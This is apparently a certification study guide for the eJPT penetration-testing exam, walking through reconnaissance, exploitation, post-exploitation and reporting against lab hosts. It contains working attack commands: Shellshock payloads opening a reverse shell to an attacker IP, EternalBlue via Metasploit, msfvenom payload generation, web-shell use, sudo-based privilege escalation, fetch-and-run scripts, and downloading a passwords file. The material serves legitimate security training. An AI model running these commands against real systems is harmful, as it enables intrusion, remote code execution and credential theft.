---
title: "eJPT Methodology - Complete Penetration Testing Framework"
topic: "eJPT Methodology"
exam_objective: "Complete framework covering all eJPT testing phases"
difficulty: "Medium"
tools:
  - "nmap"
  - "metasploit"
  - "burp suite"
  - "dirb"
  - "enum4linux"
related_labs:
  - "networking-fundamentals.md"
  - "linux-essentials.md"
  - "information-gathering-basics.md"
file_path: "01-theory-foundations/ejpt-methodology.md"
last_updated: "2025-01-19"
tags:
  - "methodology"
  - "framework"
  - "pentesting"
  - "ejpt"
---

# 🎯 eJPT Methodology - Complete Penetration Testing Framework

**A complete, easy-to-follow methodology guide for systematic penetration testing with detailed steps, practical examples, and eJPT exam preparation materials.**

**📍 File Location:** 01-theory-foundations/ejpt-methodology.md

---

## 🎯 What is eJPT Methodology?

The eLearnSecurity Junior Penetration Tester (eJPT) methodology is a **systematic 5-phase approach** for penetration testing. Unlike other certifications that focus on theory, eJPT tests your **hands-on practical skills** through real scenarios.

### 🔍 **What eJPT Methodology Does:**
- **Structured Testing:** Step-by-step process for finding and exploiting vulnerabilities
- **Real-World Focus:** Practical skills used in actual penetration testing jobs
- **Complete Coverage:** Network and web application security testing
- **Professional Standards:** Industry-accepted testing procedures
- **Evidence Collection:** Proper documentation for client reports

### 💡 **Why This Matters for eJPT:**
The methodology gives you a clear roadmap for the 72-hour practical exam. You'll know exactly what to do at each step, saving time and ensuring you don't miss important vulnerabilities.

---

## 📦 The 5 Testing Phases

### **📊 Phase Overview:**
The eJPT methodology follows these 5 phases in order:

| Phase | Name | Time % | Exam % | What You Do |
|-------|------|--------|---------|-------------|
| 1️⃣ | **Information Gathering** | 20-30% | 20% | Find hosts, ports, services |
| 2️⃣ | **Assessment** | 15-25% | 25% | Identify vulnerabilities |
| 3️⃣ | **Exploitation** | 35-45% | 35% | Attack and gain access |
| 4️⃣ | **Post-Exploitation** | 10-20% | 15% | Escalate and explore |
| 5️⃣ | **Reporting** | 5-10% | 5% | Document findings |

### **⚙️ Essential Tools Setup:**

```bash
# Check your tools are ready
which nmap && echo "nmap: OK" || echo "nmap: MISSING"
which metasploit-framework && echo "msf: OK" || echo "msf: MISSING"
which dirb && echo "dirb: OK" || echo "dirb: MISSING"
which enum4linux && echo "enum4linux: OK" || echo "enum4linux: MISSING"

# Update tool databases
sudo updatedb
sudo msfdb init
```

---

## 🔧 Phase 1: Information Gathering

### **🎯 Phase Objectives:**
1. **Find Live Hosts:** Discover systems in the target network
2. **Scan Ports:** Find open ports and running services
3. **Identify Services:** Get service versions and details
4. **Build Intelligence:** Create a complete target profile

### **⚙️ Step-by-Step Process:**

#### **Step 1: Network Discovery**

```bash
# Find live hosts (most important first step)
nmap -sn 192.168.1.0/24
# Expected output: List of IP addresses that respond

# Alternative methods if ping is blocked
arp-scan -l
netdiscover -r 192.168.1.0/24
masscan -p1-1000 192.168.1.0/24 --rate=1000
```

**What This Shows:**
- Which systems are online and reachable
- How many targets you need to test
- Network layout and organization

#### **Step 2: Port Scanning**

```bash
# Quick scan for common ports (fast initial scan)
nmap -F 10.10.10.5
# Expected output: Common open ports (22, 80, 135, 445, etc.)

# Full port scan (comprehensive but slower)
nmap -p- 10.10.10.5
# Expected output: All open ports from 1-65535

# Service detection (get detailed service info)
nmap -sV -p 22,80,135,445 10.10.10.5
# Expected output: Service names and versions
```

#### **Step 3: Service Enumeration**

```bash
# Web services enumeration
whatweb http://10.10.10.5
dirb http://10.10.10.5 /usr/share/dirb/wordlists/common.txt
nikto -h http://10.10.10.5

# SMB enumeration
enum4linux 10.10.10.5
smbclient -L \\10.10.10.5
nmap --script smb-enum* 10.10.10.5

# SSH enumeration
nmap --script ssh-enum* 10.10.10.5
```

### **📝 Phase 1 Deliverables:**

```markdown
# Information Gathering Results

## Network Discovery:
- Total hosts found: X
- Live systems: [list IP addresses]
- Network range: [IP range tested]

## Port Scan Results:
Host: 10.10.10.5
- Port 22/tcp: SSH (OpenSSH 7.4)
- Port 80/tcp: HTTP (Apache 2.4.41)
- Port 135/tcp: RPC
- Port 445/tcp: SMB

## Service Details:
- Web server: Apache 2.4.41 with PHP
- SMB shares: IPC$, C$, Admin$
- SSH: Allows password authentication
```

---

## 🔍 Phase 2: Assessment & Vulnerability Analysis

### **🎯 Phase Objectives:**
1. **Find Vulnerabilities:** Identify security weaknesses
2. **Assess Risk:** Understand impact and difficulty
3. **Research Exploits:** Find working attack methods
4. **Plan Attacks:** Choose best vulnerability to exploit

### **⚙️ Step-by-Step Process:**

#### **Step 1: Automated Vulnerability Scanning**

```bash
# General vulnerability scan
nmap --script vuln 10.10.10.5
# Expected output: CVE numbers and vulnerability details

# SMB-specific vulnerabilities
nmap --script=smb-vuln* 10.10.10.5
# Expected output: EternalBlue, MS17-010 detection

# Web vulnerabilities
nmap --script=http-vuln* 10.10.10.5
nikto -h http://10.10.10.5
# Expected output: Web app vulnerabilities and misconfigurations
```

#### **Step 2: Manual Vulnerability Testing**

```bash
# Directory traversal test
curl "http://10.10.10.5/index.php?page=../../../etc/passwd"
# Expected output: System files or error messages

# SQL injection test
curl "http://10.10.10.5/login.php?id=1' OR '1'='1"
# Expected output: Database errors or unusual responses

# Command injection test
curl "http://10.10.10.5/ping.php?host=127.0.0.1;id"
# Expected output: Command execution results
```

#### **Step 3: Exploit Research**

```bash
# Search for exploits
searchsploit apache 2.4.41
searchsploit ms17-010
searchsploit CVE-2017-0143

# Metasploit search
msfconsole -q -x "search ms17-010"
msfconsole -q -x "search apache"
```

### **🎯 Risk Assessment Matrix:**

| Vulnerability | CVSS Score | Easy to Exploit? | Impact | Priority |
|---------------|------------|------------------|---------|----------|
| EternalBlue (MS17-010) | 9.3 | High | Critical | 🔴 P1 |
| Shellshock | 10.0 | High | Critical | 🔴 P1 |
| Directory Traversal | 7.5 | High | High | 🟠 P2 |
| Weak SSH Keys | 5.3 | Medium | Medium | 🟡 P3 |

---

## ⚡ Phase 3: Exploitation

### **🎯 Phase Objectives:**
1. **Get Initial Access:** Break into target systems
2. **Establish Shells:** Get command-line access
3. **Verify Access:** Confirm successful compromise
4. **Maintain Access:** Keep connection stable

### **⚙️ Step-by-Step Process:**

#### **Step 1: Metasploit Exploitation**

```bash
# Start Metasploit
msfconsole -q

# Use EternalBlue exploit (most common in eJPT)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.15
set LHOST 10.10.14.5
set payload windows/x64/meterpreter/reverse_tcp
exploit

# Expected result: Meterpreter session
meterpreter > getuid
# Output: NT AUTHORITY\SYSTEM
```

#### **Step 2: Manual Exploitation**

```bash
# Shellshock exploitation
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'id'" \
  http://10.10.10.5/cgi-bin/test.cgi
# Expected output: User ID information

# Reverse shell via Shellshock
nc -nlvp 4444 &
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'" \
  http://10.10.10.5/cgi-bin/test.cgi
# Expected result: Reverse shell connection
```

#### **Step 3: Shell Improvement**

```bash
# Upgrade to better shell (Linux)
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z to background
stty raw -echo; fg
# Press Enter twice

# Test shell functionality
whoami
pwd
id
uname -a
```

### **🔄 Payload Generation:**

```bash
# Create additional payloads
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=5555 -f elf > shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=6666 -f exe > meter.exe

# Transfer files to target
python3 -m http.server 8080
# On target: wget http://10.10.14.5:8080/shell
```

---

## 🚀 Phase 4: Post-Exploitation

### **🎯 Phase Objectives:**
1. **Escalate Privileges:** Get admin/root access
2. **Explore System:** Find sensitive information
3. **Lateral Movement:** Access other systems
4. **Maintain Persistence:** Keep long-term access

### **⚙️ Step-by-Step Process:**

#### **Step 1: Privilege Escalation (Linux)**

```bash
# System information gathering
uname -a
cat /etc/issue
ps aux
netstat -antup

# Find SUID binaries
find / -perm -4000 2>/dev/null
# Expected output: List of SUID programs

# Check sudo permissions
sudo -l
# Expected output: Commands user can run as sudo

# Automated enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

#### **Step 2: Privilege Escalation (Windows)**

```powershell
# System information
systeminfo
whoami /all
net user
net localgroup administrators

# Service enumeration
sc query
wmic service list brief

# Automated escalation check
powershell -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"
```

#### **Step 3: Data Collection**

```bash
# Important file locations (Linux)
cat /etc/passwd
cat /etc/shadow  # (requires root)
find / -name "*.conf" 2>/dev/null
find / -name "*password*" 2>/dev/null

# Important file locations (Windows)
dir "C:\Users\" /s
dir "C:\Program Files\" /s
type "C:\Windows\System32\drivers\etc\hosts"
```

### **🔄 Lateral Movement:**

```bash
# Network discovery from inside
arp -a
netstat -rn
ip route show

# Scan internal network
./nmap -sn 192.168.100.0/24
./nmap -p 22,135,445,3389 192.168.100.1-50
```

---

## 📝 Phase 5: Reporting & Documentation

### **🎯 Phase Objectives:**
1. **Organize Evidence:** Collect all screenshots and outputs
2. **Document Findings:** Write clear vulnerability descriptions
3. **Assess Business Risk:** Explain impact to organization
4. **Provide Solutions:** Give actionable recommendations

### **⚙️ Documentation Process:**

#### **Step 1: Evidence Organization**

```bash
# Create evidence folders
mkdir -p ejpt_evidence/{recon,vulns,exploits,post_exploit}
mkdir -p ejpt_evidence/screenshots/{phase1,phase2,phase3,phase4}

# Save command history
history > ejpt_evidence/command_history.txt

# Create findings summary
echo "eJPT Assessment Summary - $(date)" > ejpt_evidence/summary.txt
```

#### **Step 2: Report Template**

```markdown
# Penetration Testing Report

## Executive Summary
- **Target Network:** 10.10.10.0/24
- **Assessment Period:** [dates]
- **Critical Issues Found:** X
- **Systems Compromised:** Y/Z

## Key Findings
1. **EternalBlue Vulnerability (Critical)**
   - **Affected System:** 10.10.10.15
   - **Impact:** Complete system compromise
   - **Evidence:** Meterpreter session with SYSTEM privileges

2. **Shellshock Vulnerability (Critical)**
   - **Affected System:** 10.10.10.5
   - **Impact:** Remote command execution
   - **Evidence:** Reverse shell access as www-data user

## Recommendations
1. **Immediate:** Apply security patches for MS17-010
2. **Short-term:** Update web server and disable CGI if not needed
3. **Long-term:** Implement network segmentation and monitoring
```

---

## 🎯 eJPT Exam Success Guide

### **📊 What You'll See in the Exam:**

#### **Exam Structure:**
- **Duration:** 72 hours (3 days)
- **Format:** 100% hands-on practical testing
- **Questions:** 35 multiple-choice questions
- **Passing Score:** 70% (25 out of 35 correct)
- **Environment:** Browser-based lab with Kali Linux

#### **Question Distribution:**

```markdown
## eJPT Content Breakdown

### Information Gathering (20% - 7 questions)
**Skills Tested:**
- Host discovery with nmap
- Port scanning and service identification
- Directory enumeration with dirb/gobuster
- SMB enumeration with enum4linux

**Must-Know Commands:**
nmap -sn 192.168.1.0/24          # Host discovery
nmap -sV -p- target_ip           # Service detection
dirb http://target/              # Directory enumeration
enum4linux target_ip             # SMB enumeration

### Vulnerability Assessment (25% - 9 questions)
**Skills Tested:**
- Vulnerability scanning with nmap scripts
- Manual vulnerability testing
- Exploit research with searchsploit
- Risk assessment

**Must-Know Commands:**
nmap --script vuln target_ip     # Vulnerability scan
nmap --script=smb-vuln* target   # SMB vulnerabilities
searchsploit service version     # Exploit research
nikto -h http://target           # Web vulnerabilities

### Exploitation (35% - 12 questions)
**Skills Tested:**
- Metasploit framework usage
- Manual exploitation techniques
- Shell access and improvement
- Payload generation

**Must-Know Commands:**
msfconsole                       # Start Metasploit
use exploit/path/to/module       # Select exploit
set RHOSTS target_ip             # Configure target
exploit                          # Execute attack
msfvenom -p payload LHOST=ip LPORT=port -f format  # Generate payloads

### Post-Exploitation (15% - 5 questions)
**Skills Tested:**
- Privilege escalation
- File transfer methods
- System enumeration
- Basic persistence

**Must-Know Commands:**
sudo -l                          # Check sudo permissions
find / -perm -4000 2>/dev/null   # Find SUID binaries
python3 -m http.server 8080     # File transfer server
wget http://attacker/file       # Download files

### Reporting (5% - 2 questions)
**Skills Tested:**
- Evidence collection
- Finding documentation
- Risk assessment
```

### **🏆 Common Exam Scenarios:**

#### **Scenario 1: Network Discovery and Enumeration**
**What You'll Do:**
1. Find live hosts in given network range
2. Scan ports on discovered systems
3. Identify services and versions
4. Answer questions about findings

**Time Management:** 30-45 minutes
**Example Questions:**
- "How many hosts are alive in 192.168.1.0/24?"
- "What version of Apache is running on 192.168.1.10?"
- "What SMB shares are available on the domain controller?"

#### **Scenario 2: Web Application Testing**
**What You'll Do:**
1. Enumerate web directories and files
2. Test for common vulnerabilities
3. Exploit findings to gain access
4. Document web shell locations

**Time Management:** 45-60 minutes
**Example Questions:**
- "What hidden directory contains admin functionality?"
- "Upload a web shell and provide the URL"
- "What user account did you compromise?"

#### **Scenario 3: SMB and File Sharing**
**What You'll Do:**
1. Enumerate SMB shares and permissions
2. Test for null sessions and weak authentication
3. Access files and gather intelligence
4. Document sensitive information found

**Time Management:** 30-45 minutes
**Example Questions:**
- "What files are in the 'backup' share?"
- "What username and password did you find in config files?"
- "What is the Administrator's password hash?"

### **⏰ Time Management Strategy:**

#### **72-Hour Timeline:**

```markdown
# Day 1 (24 hours): Discovery and Analysis
Hours 1-8:   Complete network enumeration
Hours 9-16:  Vulnerability assessment and research
Hours 17-24: Initial exploitation attempts

# Day 2 (24 hours): Exploitation and Access
Hours 25-32: Continue exploitation, gain shells
Hours 33-40: Post-exploitation and privilege escalation
Hours 41-48: Lateral movement and data collection

# Day 3 (24 hours): Documentation and Questions
Hours 49-60: Organize evidence and findings
Hours 61-72: Answer exam questions and review
```

### **🎯 Success Tips:**

#### **Before You Start:**
- Take screenshots of EVERYTHING
- Save all command outputs to files
- Create organized directory structure
- Test tools and confirm they work

#### **During the Exam:**
- Follow methodology systematically
- Don't skip enumeration phases
- Document as you go, not at the end
- Take breaks every 2-3 hours

#### **Common Mistakes to Avoid:**
- Rushing through enumeration
- Not taking enough screenshots
- Forgetting to test web shells after upload
- Not organizing evidence properly

### **💡 Quick Commands for Copy-Paste:**

```bash
# Host discovery
nmap -sn 10.10.10.0/24

# Service scan
nmap -sC -sV -p- 10.10.10.5

# Web enumeration
dirb http://10.10.10.5 /usr/share/dirb/wordlists/common.txt

# SMB enumeration
enum4linux 10.10.10.5

# Vulnerability scan
nmap --script vuln 10.10.10.5

# Metasploit
msfconsole -q
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.15
exploit

# Shell upgrade
python -c 'import pty; pty.spawn("/bin/bash")'

# File transfer
python3 -m http.server 8080
wget http://10.10.14.5:8080/file
```

---

## 🧪 Complete Lab Example: Corporate Network Assessment

### **Lab Setup:**

```markdown
# Target Environment
Network: 10.10.10.0/24
Objective: Complete penetration test
Time Limit: 8 hours (practice scenario)

# Available Information
- Network range: 10.10.10.0/24
- No credentials provided
- Test all discovered systems
- Document all findings
```

### **Phase 1: Information Gathering (90 minutes)**

```bash
# Host discovery
$ nmap -sn 10.10.10.0/24
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-15 10:00 EST
Nmap scan report for 10.10.10.1
Host is up (0.0010s latency).
Nmap scan report for 10.10.10.5
Host is up (0.0012s latency).
Nmap scan report for 10.10.10.15
Host is up (0.0015s latency).
Nmap scan report for 10.10.10.25
Host is up (0.0008s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.58 seconds

# Port scanning each host
$ nmap -sC -sV -p- 10.10.10.5
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1

# Web enumeration
$ dirb http://10.10.10.5

----- SCANNING URL: http://10.10.10.5/ -----
+ http://10.10.10.5/cgi-bin/ (CODE:403|SIZE:210)
+ http://10.10.10.5/icons/ (CODE:403|SIZE:207)
+ http://10.10.10.5/manual/ (CODE:403|SIZE:208)

# SMB enumeration on file server
$ enum4linux 10.10.10.15
Starting enum4linux v0.8.9
Target Information
==================
Target ........... 10.10.10.15
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''

Share Enumeration on 10.10.10.15
================================
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        backup          Disk      Backup Files
```

### **Phase 2: Vulnerability Assessment (60 minutes)**

```bash
# Vulnerability scanning
$ nmap --script vuln 10.10.10.5
PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271

$ nmap --script=smb-vuln* 10.10.10.15
PORT    STATE SERVICE
445/tcp open  microsoft-ds
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
```

### **Phase 3: Exploitation (120 minutes)**

```bash
# Shellshock exploitation
$ curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'id'" \
  http://10.10.10.5/cgi-bin/test.cgi
uid=48(apache) gid=48(apache) groups=48(apache)

# Get reverse shell
$ nc -nlvp 4444 &
$ curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'" \
  http://10.10.10.5/cgi-bin/test.cgi

# Shell received
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.5] 45234
bash-4.2$ whoami
apache

# EternalBlue exploitation
$ msfconsole -q
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.15
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.5
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### **Phase 4: Post-Exploitation (90 minutes)**

```bash
# Linux privilege escalation
bash-4.2$ sudo -l
User apache may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/python

bash-4.2$ sudo python -c 'import os; os.system("/bin/bash")'
[root@webserver ~]# id
uid=0(root) gid=0(root) groups=0(root)

# Windows data extraction
meterpreter > cd C:\\Users\\Administrator\\Documents
meterpreter > ls
Listing: C:\Users\Administrator\Documents
=========================================
Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100666/rw-rw-rw-  1247    fil   2024-01-10 15:30:25 -0500  passwords.txt
100666/rw-rw-rw-  2156    fil   2024-01-08 09:15:42 -0500  backup_config.xml

meterpreter > download passwords.txt
[*] Downloading: passwords.txt -> passwords.txt
[*] Downloaded 1.22 KiB of 1.22 KiB (100.0%): passwords.txt -> passwords.txt
```

### **Phase 5: Documentation (60 minutes)**

```markdown
# Lab Assessment Results

## Systems Compromised: 2/4 (50%)

### 10.10.10.5 (Web Server) - FULL COMPROMISE
- **Initial Access:** Shellshock (CVE-2014-6271)
- **Privilege Escalation:** Sudo misconfiguration
- **Final Access:** root
- **Evidence:** Root shell screenshot, /etc/shadow access

### 10.10.10.15 (File Server) - FULL COMPROMISE  
- **Initial Access:** EternalBlue (MS17-010)
- **Access Level:** NT AUTHORITY\SYSTEM (no escalation needed)
- **Data Accessed:** Administrator documents, password files
- **Evidence:** Meterpreter session, downloaded files

## Critical Findings
1. **Shellshock vulnerability allows remote code execution**
2. **EternalBlue vulnerability provides instant admin access**
3. **Weak sudo configuration enables privilege escalation**
4. **Sensitive files stored in administrator documents**

## Business Impact
- **Confidentiality:** CRITICAL - Complete data access
- **Integrity:** HIGH - Admin access allows data modification  
- **Availability:** HIGH - Systems can be shut down
```

---

## ⚠️ Common Problems and Solutions

### **❌ Problem 1: Nmap Not Finding Hosts**
**What You See:**

```bash
$ nmap -sn 10.10.10.0/24
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 256 IP addresses (0 hosts up) scanned
```

**How to Fix:**

```bash
# Try different discovery methods
nmap -Pn 10.10.10.0/24          # Skip ping
nmap -PS22,80,443 10.10.10.0/24 # TCP SYN ping
arp-scan -l                     # ARP discovery
masscan -p1-1000 10.10.10.0/24 --rate=1000  # Fast scan
```

### **❌ Problem 2: Metasploit Exploits Failing**
**What You See:**

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 10.10.14.5:4444 
[-] 10.10.10.15:445 - Exploit failed: Rex::Proto::SMB::Exceptions::ErrorCode
```

**How to Fix:**

```bash
# Check if target is actually vulnerable first
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.10.10.15
run

# Try different payload
set payload windows/shell_reverse_tcp

# Check target architecture
nmap -O 10.10.10.15
```

### **❌ Problem 3: Web Shell Upload Fails**
**What You See:**
- File uploads but doesn't execute
- Gets downloaded instead of executed
- Permission denied errors

**How to Fix:**

```bash
# Check file extension restrictions
curl -X PUT --data-binary @test.php http://target/test.php
curl -X PUT --data-binary @test.asp http://target/test.asp

# Try different web shells
# PHP: /usr/share/webshells/php/simple-backdoor.php
# ASP: /usr/share/webshells/asp/cmd.asp
# JSP: /usr/share/webshells/jsp/cmd.jsp

# Test execution
curl "http://target/shell.php?cmd=id"
```

### **❌ Problem 4: Shell Connections Drop**
**What You See:**
- Reverse shell connects then immediately disconnects
- Commands don't execute properly
- Shell becomes unresponsive

**How to Fix:**

```bash
# Use stable shell technique
nc -nlvp 4444 &
# In shell:
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Upgrade shell immediately
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Use different ports (80, 443, 53)
nc -nlvp 80
```

---

## 📊 Quick Reference

### **🚀 Essential Commands for Copy-Paste:**

```bash
# PHASE 1: INFORMATION GATHERING
nmap -sn 192.168.1.0/24                    # Host discovery
nmap -sC -sV -p- target_ip                 # Full service scan
dirb http://target/                        # Directory enumeration
enum4linux target_ip                       # SMB enumeration

# PHASE 2: VULNERABILITY ASSESSMENT
nmap --script vuln target_ip               # Vulnerability scan
searchsploit service version               # Exploit research
nikto -h http://target                     # Web vulnerability scan

# PHASE 3: EXPLOITATION
msfconsole                                 # Launch Metasploit
search ms17-010                           # Search for exploits
use exploit/path/to/module                # Select exploit
set RHOSTS target_ip                      # Configure target
exploit                                   # Execute

# PHASE 4: POST-EXPLOITATION
python -c 'import pty; pty.spawn("/bin/bash")'  # Shell upgrade
sudo -l                                   # Check sudo permissions
find / -perm -4000 2>/dev/null           # Find SUID binaries
python3 -m http.server 8080              # File transfer server

# PHASE 5: DOCUMENTATION
mkdir ejpt_evidence                       # Create evidence folder
history > commands.txt                    # Save command history
```

### **💡 Memory Helpers:**
- **Phase 1:** Find and Count (hosts, ports, services)
- **Phase 2:** Test and Research (vulnerabilities, exploits)
- **Phase 3:** Attack and Access (exploit, shells)
- **Phase 4:** Escalate and Explore (privileges, data)
- **Phase 5:** Document and Deliver (evidence, reports)

### **🎯 eJPT Exam Checklist:**
- [ ] Network discovery completed
- [ ] All open ports identified
- [ ] Services enumerated and documented
- [ ] Vulnerabilities found and tested
- [ ] At least one system compromised
- [ ] Evidence properly organized
- [ ] Screenshots taken throughout
- [ ] Command outputs saved

---

## 🔗 Integration with Other Testing Tools

### **🎯 Complete Testing Workflow:**

#### **Discovery Phase Integration:**

```bash
# Nmap + Masscan combination
masscan -p1-65535 192.168.1.0/24 --rate=1000 > masscan_results.txt
nmap -sV -p $(cat masscan_results.txt | grep open | cut -d/ -f1 | tr '\n' ',') target_ip

# Web enumeration chain
whatweb http://target | tee whatweb.txt
dirb http://target /usr/share/dirb/wordlists/common.txt | tee dirb.txt
gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.txt
nikto -h http://target | tee nikto.txt
```

#### **Exploitation Chain:**

```bash
# Manual to Metasploit transition
# 1. Manual verification
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'id'" http://target/cgi-bin/test.cgi

# 2. Metasploit automation
msfconsole -q -x "use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS target; set TARGETURI /cgi-bin/test.cgi; exploit"

# 3. Shell improvement
# In meterpreter: shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

#### **Post-Exploitation Integration:**

```bash
# Privilege escalation tool chain
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 8080 &
# On target: wget http://attacker:8080/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh

# Windows enumeration chain
# Upload PowerUp.ps1
powershell -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('http://attacker:8080/PowerUp.ps1'); Invoke-AllChecks"
```

---

## 📝 Professional Documentation Templates

### **📋 Quick Findings Template:**

```markdown
# eJPT Assessment - Quick Results

## Target Environment
- **Network:** [IP range]
- **Systems Tested:** [number]
- **Test Duration:** [hours]
- **Date:** [date]

## Critical Findings
1. **[Vulnerability Name]** - [System IP]
   - **Risk:** Critical/High/Medium/Low
   - **Impact:** [description]
   - **Exploit Status:** Success/Failed
   - **Evidence:** [file/screenshot reference]

## System Access Summary
| System | IP | Access Level | Method | Status |
|--------|----|--------------| -------|---------|
| Web Server | 10.10.10.5 | root | Shellshock + sudo | COMPROMISED |
| File Server | 10.10.10.15 | SYSTEM | EternalBlue | COMPROMISED |
| Database | 10.10.10.25 | postgres | Default creds | ACCESSED |

## Next Steps
- [ ] Complete privilege escalation on remaining systems
- [ ] Extract sensitive data for impact demonstration
- [ ] Document all findings with screenshots
- [ ] Prepare final report
```

### **🔧 Technical Details Template:**

```markdown
## Technical Exploitation Details

### Vulnerability: [Name]
**CVE:** [CVE number if applicable]
**CVSS Score:** [score]
**Affected System:** [IP address]

#### Discovery
```bash
# Commands used to find vulnerability
nmap --script vuln target_ip
# Results showing vulnerability confirmation
```

#### Exploitation
```bash
# Step-by-step exploitation process
msfconsole
use exploit/path/to/exploit
set RHOSTS target_ip
exploit
# Results and proof of compromise
```

#### Impact Demonstration
```bash
# Commands showing access and control
whoami
id
uname -a
# Screenshots and evidence files
```

#### Remediation
- **Immediate:** [emergency actions]
- **Short-term:** [fixes within 1 month]
- **Long-term:** [strategic improvements]
```

---

## 📚 Learning Resources and Practice

### **📖 Official Study Materials:**
- **INE PTS Course:** Complete video training with labs
- **eJPT Practice Labs:** Hands-on vulnerable environments
- **Official Study Guide:** Comprehensive exam preparation

### **🏃‍♂️ Free Practice Platforms:**
- **TryHackMe:** eJPT preparation rooms and paths
- **HackTheBox:** Starting Point machines
- **VulnHub:** Downloadable vulnerable VMs
- **DVWA:** Web application testing practice

### **📺 Video Learning:**
- Search for "eJPT methodology" tutorials
- "Practical penetration testing" courses
- "Metasploit basics for beginners"
- "Web application security testing"

### **🔧 Local Lab Setup:**

```bash
# Create practice environment
# Download VirtualBox/VMware
# Get Kali Linux VM
# Download vulnerable targets:
# - Metasploitable 2
# - DVWA
# - VulnHub machines

# Network setup
# Host-only network: 192.168.56.0/24
# Kali: 192.168.56.100
# Targets: 192.168.56.101-110
```

---

## 🎓 Study Schedule and Preparation

### **📅 8-Week Study Plan:**

#### **Weeks 1-2: Foundation**
- Linux command line mastery
- Networking basics
- Tool installation and verification
- Basic nmap usage

#### **Weeks 3-4: Information Gathering**
- Advanced nmap techniques
- Service enumeration methods
- Web directory discovery
- SMB and database enumeration

#### **Weeks 5-6: Exploitation**
- Metasploit framework mastery
- Manual exploitation techniques
- Shell handling and improvement
- Web application attacks

#### **Weeks 7-8: Integration and Practice**
- Complete methodology practice
- Mock exam scenarios
- Documentation and reporting
- Time management skills

### **📊 Daily Practice Routine:**

```markdown
# Morning Session (60 minutes)
- 20 minutes: Theory review
- 30 minutes: Tool practice
- 10 minutes: Note taking

# Evening Session (90 minutes)
- 60 minutes: Hands-on lab work
- 20 minutes: Documentation practice
- 10 minutes: Progress review
```

### **✅ Readiness Checklist:**
- [ ] Can complete host discovery in under 5 minutes
- [ ] Finds all open ports on target systems
- [ ] Identifies service versions accurately
- [ ] Successfully exploits common vulnerabilities
- [ ] Upgrades shells and maintains access
- [ ] Documents findings professionally
- [ ] Manages time effectively during testing

---

## 🆘 Emergency Help and Troubleshooting

### **When Tools Don't Work:**

```bash
# Tool verification
which nmap metasploit-framework dirb enum4linux
# Update everything
sudo apt update && sudo apt upgrade
sudo msfdb init
```

### **Network Connectivity Issues:**

```bash
# Basic connectivity tests
ping target_ip
traceroute target_ip
nmap -Pn target_ip
```

### **Getting Unstuck:**
1. **Read error messages carefully**
2. **Try alternative methods**
3. **Check tool documentation: man [tool]**
4. **Search for specific error messages**
5. **Use community forums and Discord**

### **Study Resources:**
- **Reddit:** r/eJPT, r/NetSecStudents
- **Discord:** InfoSec study groups
- **YouTube:** Practical pentesting tutorials
- **GitHub:** eJPT study guides and notes

---

## 🎯 Final Success Tips

### **Exam Day Strategy:**
1. **Stay calm and methodical**
2. **Follow the 5-phase process**
3. **Take screenshots of everything**
4. **Save command outputs constantly**
5. **Take breaks every 2-3 hours**
6. **Sleep at least 4-6 hours each night**

### **Mental Preparation:**
- The exam tests practical skills, not memorization
- You have 72 hours - use the time wisely
- Document as you go, not at the end
- It's okay to get stuck - move to other targets
- Your methodology will guide you through

### **After the Exam:**
- Don't obsess over performance
- Results come in 5-7 business days
- Continue practicing regardless of outcome
- Use experience to improve skills further

---

## 📞 Conclusion

